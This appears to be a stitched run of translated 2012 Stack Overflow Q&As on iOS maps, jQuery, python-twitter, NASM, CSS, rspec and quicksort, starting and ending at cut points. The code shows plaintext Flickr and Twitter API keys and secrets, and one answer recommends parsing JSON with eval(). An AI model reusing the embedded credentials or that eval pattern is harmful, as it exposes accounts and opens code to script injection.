从 Flickr 我也得到了经度和纬度数据。

我希望能够显示带有每个图像的经纬度的地图，然后使用 mapview 将其显示到 xib 上。

如何将数据从 WebserviceEXVC.m 传递给 DVC.H 和 DVC.m？（我已经在xib上显示更大的图像。我想用地图替换更大的图像。我该如何在地图视图中显示长和纬度？

```
 WebServiceExampleVC.h

    //
    //  WebServiceExampleViewController.h
    //  WebServiceExample
    //
    //  Created by Computerlab on 7/22/12.
    //  Copyright (c) 2012 __MyCompanyName__. All rights reserved.
    //

    #import <UIKit/UIKit.h>

    @interface WebServiceExampleViewController : UIViewController <UITableViewDelegate, UITableViewDataSource>{

        NSMutableArray* photoTitles;
        NSMutableArray* photoSmallImageData;
        NSMutableArray* photoURLsLargeImage;
        //latitude":48.886392, "longitude"
        NSMutableArray* photolongitude;
        NSMutableArray* photolatitude;

        NSMutableArray* photoURLsLargeData;

        NSURLConnection* connection;
        NSMutableData* receivedData;

    }    

    @property (nonatomic, strong) IBOutlet UITableView* myTableView;

    -(void)searchFlickrPhotos:(NSString*)text;

    @end

        WebServiceExampleVC.m

     //
        //  WebServiceExampleViewController.m
        //  WebServiceExample
        //
        //  Created by Computerlab on 7/22/12.
        //  Copyright (c) 2012 __MyCompanyName__. All rights reserved.
        //

        #import "WebServiceExampleViewController.h"
        #import "DVC.h"

        //NSString *const FlickrAPIKey = @"ac35247e7b67528944f322cceb05704b";
        //My Key
        NSString *const FlickrAPIKey = @"00af42177056c5b71bda9bd49938c1df";

        @interface WebServiceExampleViewController ()

        @end

        @implementation WebServiceExampleViewController
        @synthesize myTableView;

        -(UITableViewCell*)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath{
            static NSString* CellIdentifier = @"Cell";
            int row = indexPath.row;

            UITableViewCell* cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

            if(cell == nil){
                cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:CellIdentifier];
                NSLog(@"%d - NEW CELL", row);
            }
            else {
                NSLog(@"%d - OLD CELL", row);
            }

            cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;

            UILabel* x2 = cell.textLabel;
            CGRect r = x2.frame;
            r.size.height = 100;
            x2.frame = r;
            x2.text = [NSString stringWithFormat:@"%d", row];

            UILabel* detailText = cell.detailTextLabel;
           // detailText.text = [NSString stringWithFormat:@"%s", "title"];

            NSString* title = (NSString*) [photoTitles objectAtIndex:row];
            detailText.text = [NSString stringWithFormat:@"%@", title];
            NSString* lat = (NSString*) [photolatitude objectAtIndex:row];
            detailText.text = [NSString stringWithFormat:@"%@", lat];
            NSString* longi = (NSString*) [photolongitude objectAtIndex:row];
            detailText.text = [NSString stringWithFormat:@"Lat %@\r\n,Long %@\n\n,title %@\n\n", lat ,longi, title];
            //detailText.text =[NSString stringWithFormat:latitude];
            // detailText.text = [NSString stringWithFormat:@"%s", "Longitude"];
            UIImageView* imageView = cell.imageView;
            NSData* imageData = (NSData*) [photoSmallImageData objectAtIndex:row];
            imageView.image = [UIImage imageWithData:imageData];
            return cell;

        }

        - (void)connectionDidFinishLoading:(NSURLConnection *)connection{

            NSError* error;

            NSDictionary* results = [NSJSONSerialization JSONObjectWithData:receivedData
                                                                    options:kNilOptions
                                                                      error:&error];

            NSArray *photos = [[results objectForKey:@"photos"] objectForKey:@"photo"];

            for (NSDictionary *photo in photos)
            {
                NSString *title = [photo objectForKey:@"title"];
                [photoTitles addObject:(title.length > 0 ? title : @"Untitled")];
                NSLog(@"title: %@", title);

                NSString *latitude = [photo objectForKey:@"latitude"];
               [photolatitude addObject: [NSString stringWithFormat:@"%@", latitude]];
                //NSLog(@"photolatitude: %@", photolatitude);
                 NSLog(@"latitude: %@", latitude);

                NSString *longitude = [photo objectForKey:@"longitude"];
                [photolongitude addObject: [NSString stringWithFormat:@"%@", longitude]];
                //NSLog(@"photolongitude: %@",photolongitude);
                NSLog(@"longitude: %@",longitude);

                // Build the URL to where the image is stored (see the Flickr API)
                // In the format http://farmX.static.flickr.com/server/id/secret
                // Notice the "_s" which requests a "small" image 75 x 75 pixels
                NSString *photoURLString = [NSString stringWithFormat:@"http://farm%@.static.flickr.com/%@/%@_%@_s.jpg", [photo objectForKey:@"farm"], [photo objectForKey:@"server"], [photo objectForKey:@"id"], [photo objectForKey:@"secret"]]; 
                NSLog(@"photoURLString: %@", photoURLString);
                [photoSmallImageData addObject:[NSData dataWithContentsOfURL:[NSURL URLWithString:photoURLString]]];
                photoURLString = [NSString stringWithFormat:@"http://farm%@.static.flickr.com/%@/%@_%@_m.jpg", [photo objectForKey:@"farm"], [photo objectForKey:@"server"], [photo objectForKey:@"id"], [photo objectForKey:@"secret"]];
                [photoURLsLargeImage addObject:[NSURL URLWithString:photoURLString]]; 
                NSLog(@"photoURLsLareImage: %@\n\n", photoURLString); 

                [photoURLsLargeData addObject:[NSData dataWithContentsOfURL:[NSURL URLWithString:photoURLString]]];

                  //NSLog(@"photoURLsLargeData: %@\n\n", photoURLsLargeData);

            }

            NSLog(@"Size of dictionary: %d", photoSmallImageData.count);
            [myTableView reloadData];
        }

        -(void)searchFlickrPhotos:(NSString *)text
        {
            // Build the string to call the Flickr API
          /*  NSString *urlString =
            [NSString stringWithFormat:
             @"http://api.flickr.com/services/rest/?method=flickr.photos.search&api_key=%@&tags=%@&per_page=50&format=json&nojsoncallback=1", FlickrAPIKey, text];
            */

            // Build the string to call the Flickr API
            NSString *urlString =
            [NSString stringWithFormat:
             @"http://api.flickr.com/services/rest/?method=flickr.photos.search&api_key=%@&tags=%@&per_page=5&format=json&nojsoncallback=1&has_geo=1&extras=geo", FlickrAPIKey, text];

            NSLog(@"REQ SENT: %@", urlString);
            NSURL *url = [NSURL URLWithString:urlString];

            // Setup and start async download
            NSURLRequest *request = [[NSURLRequest alloc] initWithURL: url];
            connection = [[NSURLConnection alloc] initWithRequest:request 
                                                         delegate:self];

        }

        -(void)connection:(NSURLConnection*)connection didReceiveResponse:(NSURLResponse *)response{
            [receivedData setData:nil];
        }

        -(void)connection:(NSURLConnection*)connection didReceiveData:(NSData *)data{
            [receivedData appendData:data];
        }

        -(NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section{
            return photoSmallImageData.count;
        }

        -(CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath{
            return 150.0f;
        }

        - (void)viewDidLoad
        {
            [super viewDidLoad];
            // Do any additional setup after loading the view, typically from a nib.
            photoTitles = [[NSMutableArray alloc] init];
            photoSmallImageData = [[NSMutableArray alloc] init];
            photoURLsLargeImage = [[NSMutableArray alloc] init];
            photoURLsLargeData = [[NSMutableArray alloc] init];
            photolongitude = [[NSMutableArray alloc] init];
            photolatitude = [[NSMutableArray alloc] init];

            receivedData = [[NSMutableData alloc] init];
            [self searchFlickrPhotos:@"cars"];

        }

        - (void)viewDidUnload
        {
            [super viewDidUnload];
            // Release any retained subviews of the main view.
        }

        - (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
        {
            return (interfaceOrientation != UIInterfaceOrientationPortraitUpsideDown);
        }

        -(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath{

        NSData* imageData = (NSData*) [photoURLsLargeData objectAtIndex:indexPath.row];
            [[NSUserDefaults standardUserDefaults] setObject:imageData
                                                      forKey:@"largeImage"];
            [[NSUserDefaults standardUserDefaults] synchronize];

            //[[NSUserDefaults standardUserDefaults] setObject:<#(id)#> forKey:<#(NSString *)#>]

            DVC* detailView = [[DVC alloc] initWithNibName:@"DVC"
                                                    bundle:nil];

            [self.navigationController pushViewController:detailView
                                                 animated:YES];

        }

        @end

        DVC.h

 /*****
    #import <UIKit/UIKit.h>
    #import <MapKit/MapKit.h>

    @interface mapiphoneViewController : UIViewController <MKMapViewDelegate>

    @property (strong, nonatomic) IBOutlet MKMapView* map;

    @end
    ****/

        //
        //  DVC.h
        //  WebServiceExample
        //
        //  Created by Computerlab on 7/29/12.
        //  Copyright (c) 2012 __MyCompanyName__. All rights reserved.
        //

        #import <UIKit/UIKit.h>

        @interface DVC : UIViewController

        @property (strong, nonatomic) IBOutlet UIImageView* myImageView;

        @end

        DVC.m

  //
    //  DVC.m
    //  WebServiceExample
    //
    //  Created by Computerlab on 7/29/12.
    //  Copyright (c) 2012 __MyCompanyName__. All rights reserved.
    //

    #import "DVC.h"

    @interface DVC ()

    @end

    @implementation DVC
    @synthesize myImageView;

    - (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
    {
        self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
        if (self) {
            // Custom initialization
        }
        return self;
    }

    - (void)viewDidLoad
    {
        [super viewDidLoad];
        // Do any additional setup after loading the view from its nib.

        NSData* myData = [[NSUserDefaults standardUserDefaults] dataForKey:@"largeImage"];
        myImageView.image = [UIImage imageWithData:myData];

    }

    - (void)viewDidUnload
    {
        [super viewDidUnload];
        // Release any retained subviews of the main view.
        // e.g. self.myOutlet = nil;
    }

    - (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
    {
        return (interfaceOrientation == UIInterfaceOrientationPortrait);
    }

    @end

    ///Map stuff

/*****************************************************    
    @synthesize map;

    -(MKOverlayView*) mapView:(MKMapView *)mapView viewForOverlay:(id<MKOverlay>)overlay  {

        MKCircleView* circleView =[[MKCircleView alloc] initWithOverlay:overlay];
        circleView.strokeColor = [UIColor blueColor];
        circleView.fillColor = [UIColor redColor];
        return circleView;
    }

    - (void)viewDidLoad
    {
        [super viewDidLoad];
        // Do any additional setup after loading the view, typically from a nib.

        float latitude = 40.0;
        float longitude  = -75.0;

        CLLocationCoordinate2D x;
        x.latitude = latitude;
        x.longitude = longitude;

        MKCoordinateSpan z;
        z.latitudeDelta = 0.15;
        z.longitudeDelta = 0.15;

        MKCoordinateRegion y;
        y.center = x;
        y.span = z;

        map.region = y;
        [map addOverlay:[MKCircle circleWithCenterCoordinate:x
                                                      radius:1000]];
    }

******/ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T21:48:34.887

您可以使用“centerCoordinate”属性设置 MKMapView 中心点[https://developer.apple.com/library/ios/documentation/MapKit/Reference/MKMapView_Class/MKMapView/MKMapView.html#//apple_ref/occ/instp/MKMapView/centerCoordinate](https://developer.apple.com/library/ios/documentation/MapKit/Reference/MKMapView_Class/MKMapView/MKMapView.html#//apple_ref/occ/instp/MKMapView/centerCoordinate)

# javascript - Custom.js 文件有什么问题？

> ID：11917277
> 
> 赞同：-1
> 
> 时间：2012-08-11T20:11:15.690
> 
> 标签：javascript, jquery

我正在尝试将以下代码添加到其中：

```
$("#tabs").tabs("#tab-items section", {
  effect: 'fade',
  fadeOutSpeed: 0,
  fadeInSpeed: 400
});

$(".option-set").on("click", "a", function(e) {
    $(this).addClass('selected')
      .parent().siblings().find("a").removeClass('selected');
}); 
```

但是无论我把它放在哪里，我都会得到一个错误并且随机的东西停止工作。这是我的整个 custom.js 文件，我是否对文件进行了不正确的编码？我不完全确定什么时候应该使用 $(function() { 命令，什么时候没有它也可以。

```
/* --------------------------------------------------------------

INDEX:

[1] Search
[2] Popout Window
[3] Form Numbers
[4] Nav Bar
[5] Smooth Scroll
[6] Estimate Form

-------------------------------------------------------------- */

/* --------------------------------------------------------------

[1*] Search

-------------------------------------------------------------- */

document.getElementById('headerSearch').onsubmit = function() {
    window.location = "javascript:poptastic('http://www.google.com/search?q=site:northtownsremodeling.com ' + document.getElementById('headerInput').value);"
      return false;}

/* --------------------------------------------------------------

[2*] Popout Window

-------------------------------------------------------------- */

var newwindow; function poptastic(url){
  newwindow=window.open(url,'name', 'height=800,width=1020,scrollbars=yes');
    if (window.focus) {newwindow.focus()}}

/* --------------------------------------------------------------

[3*] Form Numbers

-------------------------------------------------------------- */

jQuery(function($){
    $("#menu-primary-number").mask("(999) 999-9999");
    $("#menu-zip").mask("99999");
});

/* --------------------------------------------------------------

[4*] Set Selected Menu Items & Hide

-------------------------------------------------------------- */
/*START FUNCTION*/
$(function() {

    $("#header-subnav ul").hide();
    $('.menu-option-set a[data-subid]').on('click', function(e) {
        e.preventDefault();
        var $s = $("#" + $(this).attr('data-subid'));                
        if($s.is(':hidden')) {
            $("#header-subnav").removeClass('hidden');
            $("#header-subnav ul").hide();
            $s.show();
        } else {
            $s.hide();
            $("#header-subnav").addClass('hidden');
        }
    });

    $('.menu-option-set a').click(function()
    {
        // if clicked item is selected then deselect it
        if ($(this).hasClass('selected'))
        {
            $(this).removeClass('selected');
        }

        // otherwise deselect all and select just this one
        else
        {
            $('.menu-option-set a').removeClass('selected');
            $(this).addClass('selected');
        }
    });

/* --------------------------------------------------------------

[5*] Smooth Scroll

-------------------------------------------------------------- */

    $('.navbar a, .scroll a, .smoothscroll a').bind('click',function(event){
        var $anchor = $(this);

        $('html, body').stop().animate({
            scrollTop: $($anchor.attr('href')).offset().top
        }, 850,'easeInOutExpo');
        /*
        if you don't want to use the easing effects:
        $('html, body').stop().animate({
            scrollTop: $($anchor.attr('href')).offset().top
        }, 1000);
        */
        event.preventDefault();
    });

/* --------------------------------------------------------------

[6*] Estimate Form

-------------------------------------------------------------- */

    // Setup any needed variables.
    var $form   = $('.estimate-form'),
        $loader = '<img src="/img/loader.gif" height="11" width="16" alt="Loading..." />';

    $form.append('<div id="response" class="hidden">');
    var $response = $('#response');

    // Do what we need to when form is submitted.
    $form.on('click', 'input[type=submit]', function(e){

        // Hide any previous response text and show loader
        $response.hide().html( $loader ).show();

        // Make AJAX request 
        $.post('/resource/script/estimate-send.php', $form.serialize(), function( data ) {

            // Show response message
            $response.html( data );

            // Scroll to bottom of the form to show respond message
            var bottomPosition = $form.offset().top + $form.outerHeight() - $(window).height();

            if( $(document).scrollTop() < bottomPosition )
                $('html, body').animate({ scrollTop : bottomPosition });

            // If form has been sent succesfully, clear it
            if( data.indexOf('success') !== -1 )
                $form.find('input:not(input[type="submit"], input[type="reset"]), textarea, select').val('').attr( 'checked', false );

        });

        // Cancel default action
        e.preventDefault();
    });

});/*END FUNCTION*/ 
```

多谢你们！/ 加尔斯！

**编辑：**我把它放进去时出现的错误是这样的：

未捕获的类型错误：对象 [对象对象] 没有方法“选项卡”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:39:11.010

您似乎还没有将 JQueryUI.js 添加到您的 HTML 文件中。

# python - 无法使用 twitterapi 通过 python 发布推文

> ID：11917278
> 
> 赞同：0
> 
> 时间：2012-08-11T20:11:41.940
> 
> 标签：python, twitter

```
>>> import twitter
>>> api = twitter.Api()
>>> api = twitter.Api(consumer_key='bkvRjwyoMnBo1EWw',consumer_secret='9Cg4oXgk0eIphAnewppB0sXlHQ1cBhkk',access_token_key='27436-GlzGFHPgbgGQV5RRc8oSiqeY4XsDZ',access_token_secret='fwekIDmxTPy3ZDdoVh5EVcQOxzg')
>>> status = api.PostUpdate('I love python-twitter!')

Traceback (most recent call last):
  File "<pyshell#3>", line 1, in <module>
    status = api.PostUpdate('I love python-twitter!')
  File "c:\python27\python-twitter-0.8.2\twitter.py", line 2766, in PostUpdate
    data = self._ParseAndCheckTwitter(json)
  File "c:\python27\python-twitter-0.8.2\twitter.py", line 3668, in _ParseAndCheckTwitter
    self._CheckForTwitterError(data)
  File "c:\python27\python-twitter-0.8.2\twitter.py", line 3691, in _CheckForTwitterError
    raise TwitterError(data['error'])
TwitterError: Read-only application cannot POST
>>> dir(twitter)
['ACCESS_TOKEN_URL', 'AUTHORIZATION_URL', 'Api', 'CHARACTER_LIMIT', 'DEFAULT_CACHE', 'DirectMessage', 'Hashtag', 'List', 'REQUEST_TOKEN_URL', 'SIGNIN_URL', 'Status', 'StringIO', 'Trend', 'TwitterError', 'Url', 'User', '_FileCache', '_FileCacheError', '__author__', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '__version__', '__warningregistry__', 'base64', 'calendar', 'datetime', 'gzip', 'httplib', 'md5', 'oauth', 'os', 'parse_qs', 'parse_qsl', 'rfc822', 'simplejson', 'sys', 'tempfile', 'textwrap', 'time', 'urllib', 'urllib2', 'urlparse'] 
```

如何恢复这个 TwitterError？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:39:54.267

在您的应用程序设置（在 dev.twitter.com/apps）中，您需要将其设置为读写应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-15T23:22:07.757

您需要安装 python_twitter，因为您使用的命令属于 Python_twitter，我认为您遵循 twitter 的文档。你需要检查一下。你所有的问题都有同样的问题。请检查它。您需要将您的应用程序更改为读/写。

# javascript - getJSON 只返回 [object Object],[object Object]

> ID：11917280
> 
> 赞同：2
> 
> 时间：2012-08-11T20:11:54.537
> 
> 标签：javascript, jquery, json

我正在测试一些代码，并创建了一个包含数据的 json 文件。

问题是我在警报中收到“[object Object]，[object Object]”。没有数据。

我做错了什么？

这是代码：

```
<!DOCTYPE HTML>
<html>
<head>
<title></title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>

<script>

    $(document).ready(function() {
        $.getJSON("appData.json",function(results){alert(results);});
    });

</script>

</head>
<body>

</body>
</html> 
```

这是 appData.json 的内容

```
[{"foo":"bar"},{"foo2":"blablabla"}] 
```

此外，index.html 文件和 json 文件都在我的桌面上，我正在从那里运行它。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-11T20:18:08.577

请尝试这样：

```
$.getJSON("appData.json", function(results) {
        $.each(results, function(index) {
            alert(results[index].foo);
        });
    }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T20:16:12.257

好吧，你得到了一个对象数组，数组和对象就是数据。

```
 //          v----first Object in the outer Array
alert(results[0].foo);
  //              ^----foo property of the first Object 
```

只是`alert`显示了对象的默认`toString()`值。

使用 时`$.getJSON`，jQuery 会自动将 JSON 文本解析为 JavaScript 对象。如果您想要原始 JSON，`$.get`请改为提出请求。

* * *

如果要迭代 Array，请使用`for`循环，或者 jQuery 或本机 API 中的一种迭代方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-11T20:17:59.340

当警告一个对象时，它会说`[Object]`，，如果使用 Firefox，你总是可以这样做`alert(results.toSource());`，但更好的选择是开始使用控制台 (F12)：

```
$(document).ready(function() {
    $.getJSON("appData.json",function(results){
       console.log(results);
    });
}); 
```

你可以看到整个物体及其结构。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-11T20:25:19.490

那里没有问题。那是让您知道数组中有两个对象。你得到它的原因是因为它是顶级的，所以你只能得到类型。访问 JSON 数据的一个好方法是通过递归。

```
function ContainsKeyValue( obj, key, value ){
for( all in obj )
{
    if( obj[all] != null && obj[all][key] == value ){
        return true;
    }
    if( typeof obj[all] == "object" && obj[all]!= null ){
        var found = ContainsKeyValue( obj[all], key, value );
        if( found == true ) return true;
    }
}
return false;
} 
```

这将从图中的给定对象开始，并向下递归找到的任何对象。我这样使用它：

```
var liveData = [];
for( var item in json.Items)
{
if( ContainsKeyValue( json.Items[item], "Key", "Value" ) === true )
{
    liveData.push( json.Items[item] );
}
} 
```

# sencha-touch-2 - Sencha Touch 控制器监听器在弹出后不会触发

> ID：11917281
> 
> 赞同：0
> 
> 时间：2012-08-11T20:12:05.893
> 
> 标签：sencha-touch-2, listener

我的控制器侦听器在我第一次加载视图时工作，但在弹回视图后第二次就不行了。我尝试在视图上设置 autoDestroy: false 但这并不能解决问题。

为了在弹出后重新启动我的控制器事件侦听器，我需要更改什么？

```
onNestedlistItemTap1: function(nestedlist, list, index, target, record, e, options) {
   if(record.isLeaf()) {
       console.log(this.getMainWrapper().getActiveView().id); <-- id of the view; after pop is blank
       this.getNavContainer().animateActiveItem(record.data.depth, {
           type: 'flip'
       }); <-- doesn't work after pop
    }
}, 
```

# linux - 如何找出 NASM 中部分的大小？

> ID：11917287
> 
> 赞同：0
> 
> 时间：2012-08-11T20:13:24.940
> 
> 标签：linux, nasm

我正在使用 bin 输出格式在 NASM 中编写程序。我正在手动创建 ELF 标头。我需要知道每个部分的起始地址和长度。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-12T15:46:12.357

通过定义部分顺序解决的问题

```
SECTION .header   progbits
SECTION .text     progbits  follows=.header   align=16
SECTION .rodata   progbits  follows=.text     align=16
SECTION .data     progbits  follows=.rodata   align=16
SECTION .bss      nobits    follows=.data     align=16 
```

并在文件末尾添加这些行：

```
section .header
  header_start  equ  $$
  header_length  equ  $-$$

section .text
  text_start  equ  $$
  text_length  equ  $-$$

section .rodata
  rodata_start  equ  $$
  rodata_length  equ  $-$$

section .data
  data_start  equ  $$
  data_length  equ  $-$$

section .bss
  bss_start  equ  $$
  bss_length  equ  $-$$ 
```

# ios - 修改路径时如何重绘 CAShapeLayer？

> ID：11917288
> 
> 赞同：4
> 
> 时间：2012-08-11T20:13:33.837
> 
> 标签：ios, redraw, cashapelayer

我正在尝试向我`CAShapeLayer`的路径添加一个子路径，但是除非我首先分配到`nil`路径然后我重新分配`myPath`给`CAShapeLayer`. 我试过了，`setNeedsRedisplay`但它不起作用。

这是`LoadView`where`myPath`和`shapeLayer`are 属性中的代码：

```
// The CGMutablePathRef
CGPathMoveToPoint(myPath, nil, self.view.center.x, self.view.center.y);
CGPathAddLineToPoint(myPath, nil, self.view.center.x + 100.0, self.view.center.y - 100.0);

// The CAShapeLayer
shapeLayer = [CAShapeLayer layer];
shapeLayer.path = myPath;
shapeLayer.strokeColor = [UIColor greenColor].CGColor;
shapeLayer.lineWidth = 2.0;
[self.view.layer addSublayer:shapeLayer]; 
```

例如，这是我对路径进行更改的地方。我只是添加一个新的子路径`myPath`：

```
- (void)handleOneFingerSingleTapGesture:(UIGestureRecognizer *)sender
{
    // I add a new subpath to 'myPath'
    CGPathMoveToPoint(myPath, nil, self.view.center.x, self.view.center.y);
    CGPathAddLineToPoint(myPath, nil, self.view.center.x + 100.0, self.view.center.y + 100.0);

    // I must do this to show the changes
    shapeLayer.path = nil; 
    shapeLayer.path = myPath;
} 
```

任何人都知道如何处理这个？我正在使用 iOS 5.0。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-08-19T16:26:12.390

您应该重置路径超时，在修改路径之前通过 removeAllPoints 刷新路径图。

在目标 C 中：

```
[path removeAllPoints];
[path moveToPoint:p];
[path addLineToPoint:CGPointMake(x, y)];

shapeLayer.path = path.CGPath; 
```

在 Swift 4 中：

```
path.removeAllPoints()
path.move(to: p1)
path.addLine(to: p2)

shapeLayer.path = path.cgPath 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-08-03T00:19:57.843

您必须调用 `[shapeLayer didChangeValueForKey:@"path"]`以使图层重新渲染自身。

# php - 并发ajax请求数的最大限制

> ID：11917289
> 
> 赞同：2
> 
> 时间：2012-08-11T20:13:42.587
> 
> 标签：php, ajax, performance, http

我有一个可以获取大约 20 页的网站，每个页面都不同。目前，加载大约需要 1.2 分钟。

几天前，这项任务只需要 11-15 秒。现在需要 1.2 分钟。突然变化的原因可能是什么？

除了合并其中一些以减少请求数量之外，还有其他解决方案吗？可以以某种方式更改请求数量的限制吗？

![在此处输入图像描述](../Images/73379f5aad7f8f3cfa90125e15eae8fb.png)

上面的截图来自 Firebug。条的灰色部分代表“阻塞”。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-02T06:51:03.900

应该有人建议我改用多 CURL。我只需要调用一个 PHP 文件，它就会自动调用它们中的每一个，这也是并行的。

看看[这里](http://www.rustyrazorblade.com/2008/02/curl_multi_exec/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-12T06:10:57.617

大多数 webkit 浏览器在任何给定时间只允许 2 个同时 AJAX 连接。最佳做法是让网站以 JSON 字符串的形式接收数据，然后让 JavaScript 将所有数据放在它所属的位置。鉴于您的屏幕截图，我假设后端全部使用 PHP。

从 PHP 端的 json_encode() 和 JavaScript 端的 eval() 开始，从那里应该是在公园里散步。

# html - css 表格中心在 Firefox 中不起作用

> ID：11917290
> 
> 赞同：1
> 
> 时间：2012-08-11T20:13:43.353
> 
> 标签：html, css, firefox

我使用以下方法将表格居中：

```
table{
margin-left: auto;
margin-right: auto;
} 
```

它在谷歌浏览器上运行良好，但在 Firefox 上根本不行，有什么想法吗？我应该将表格包装在一个 Div 中并为其使用特定的 ID 吗？

PS我没有在上面使用-webkit-。如果我使用 -webkit-，我确保还添加 -moz-

[JSFiddle](http://jsfiddle.net/N9pA6/)

这是一个链接供大家检查： [您可以自己查看](http://ogjewels.co.il/content/gallery/Buy-Bracelets-1.html)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T20:19:52.493

## CSS

将此添加到您的 CSS 文件中：

```
header
{
    float:none!important
    /* or remove float:right; in your current CSS file */
}
#nav
{
    background:none;
    float:right
}
#tb
{
    margin:0 auto;
    width:1080px;
    border-spacing:0;
    border:0;
    border-collapse:collapse
}
.clearfix:after
{
    clear:both;
    content:'.';
    display:block;
    font-size:0;
    height:0;
    line-height:0;
    visibility:hidden
}
.clearfix
{
    display:block;
    zoom:1
} 
```

## HTML

在您的 HTML 代码更改中：

```
<nav>
    <ul id="nav"> 
```

到：

```
<nav class="clearfix">
    <ul id="nav" class="clearfix"> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T20:24:50.917

好吧，这完全取决于您的表格嵌套的方式/位置，您需要将父容器中的内容居中或将页面主体居中，或添加`position:absolute;`到表格 css。

# ruby-on-rails - 无法让 rspec 在 Rails 中工作

> ID：11917293
> 
> 赞同：1
> 
> 时间：2012-08-11T20:13:59.013
> 
> 标签：ruby-on-rails, sqlite, rspec

我能够设置我的 rails 项目（rails 版本 3.2.7）并运行 rails generate rspec:install（rspec 版本 2.11.1）。它还在 specs 目录中构建了测试文件，但是当我运行“rspec”时，开始出现一堆错误：

```
/usr/lib/ruby/vendor_ruby/1.8/rubygems/custom_require.rb:36:in `gem_original_require': no such file to load -- bundler/setup (LoadError)
from /usr/lib/ruby/vendor_ruby/1.8/rubygems/custom_require.rb:36:in `require'
... 
```

我也试过“bundle exec rspec”，然后错误是：

```
/var/lib/gems/1.9.1/gems/sqlite3-1.3.6/lib/sqlite3/sqlite3_native.so: [BUG] Segmentation fault
ruby 1.8.7 (2011-06-30 patchlevel 352) [x86_64-linux]

Aborted (core dumped) 
```

有任何想法吗？

# algorithm - 快速排序算法：我不断得到不同的答案

> ID：11917296
> 
> 赞同：2
> 
> 时间：2012-08-11T20:14:17.423
> 
> 标签：algorithm, sorting, quicksort

我正在尝试研究各种排序和搜索算法，以准备本周二即将进行的测试。一切都很顺利，直到我使用了快速排序算法。我没有书或任何其他资源，所以我上网开始阅读[SparkNote](http://www.sparknotes.com/cs/sorting/quick/summary.html)。我以为我理解了文本，我什至阅读了我在网上找到的[PowerPoint的快速排序算法部分。](http://www.cise.ufl.edu/~ddd/cis3020/summer-97/lectures/lec17)

但是，SparkNote 在算法分步过程的页面上提供了一个示例，但并没有显示最初排列列表的步骤。给出的清单是`[5 9 3 8 6 4 2 1 7 0]`。根据 SparkNotes，排列后的列表，左侧的值小于枢轴（即 5），右侧的值大于枢轴，是 `[0 3 4 2 1 5 8 6 7 9]`. 但是，当我尝试自己完成这些步骤时，我不断得到`[ 4 0 3 1 2 5 6 8 7 9 ]`.

我采取的程序是：

```
5 9 3 8 6 4 2 1 7 0 // The initial list. Pivot = 5
5 0 3 8 6 4 2 1 7 9 // Switched 0 and 9.
5 0 3 1 6 4 2 1 7 9 // Switched 8 and 1
5 0 3 1 2 4 6 8 7 9 // Switched 6 and 2
4 0 3 1 2 5 6 8 7 9 // Switched 4 and 5 because the lines that point to the 
                    // greater and smaller numbers crossed. 
```

我的错误在哪里？另外，我看到小于5的数字在左边，大于5的数字在右边，那么，我的错误真的会影响排序吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T20:22:39.867

SparkNotes 中描述的算法最初将枢轴元素放置在数组中的*最右边*位置。您使用的算法将枢轴放置/保持在*最左边*的位置。难怪分区后的安排不一样。

这意味着他们从

```
5 9 3 8 6 4 2 1 7 0 
```

选择`5`作为枢轴并将其放置在最右边的位置（交换`5`和`0`）

```
0 9 3 8 6 4 2 1 7 5 
```

只有在那之后，他们才对剩余的元素进行分区。

您将您`5`的位置保持在最左边（显然您只是忘记执行 SparkNotes 中的第 2 步）。最后，两种变体都有效，即没有“错误”。在您的情况下，正确分区的阵列完全有效。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T20:37:51.367

[在这里](http://www.youtube.com/watch?v=ywWBy6J5gz8)你可以看到[快速排序](http://www.youtube.com/watch?v=ywWBy6J5gz8)算法的可视化实现。

也许你也会发现有用的：

*   [合并排序](http://www.youtube.com/watch?v=XaqR3G_NVoo)
*   [贝壳排序](http://www.youtube.com/watch?v=CmPA7zE8mx0)
*   [冒泡排序](http://www.youtube.com/watch?v=lyZQPjUT5B4)

**如果您讨厌匈牙利民间舞蹈，请不要访问链接。:)**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T20:27:36.877

您没有遵循 sparknotes 网站上提供的确切算法。他们的第二步要求您将枢轴与最后一个元素交换。

在任何情况下，只要您拆分序列，使得枢轴之前的所有元素都小于（或等于）枢轴并且跟随它的元素更大（或平等的）。当您对生成的分区进行递归排序时，您最终会得到一个排序后的序列。

这是一个效率问题，而不是正确性问题，您如何处理相等的元素以及如何选择枢轴，以及最终以多长的序列长度切换到另一种算法。

# android - 如何在不使用“setImageBitmap()”的情况下加载带有 png 文件的 ImageView？

> ID：11917299
> 
> 赞同：6
> 
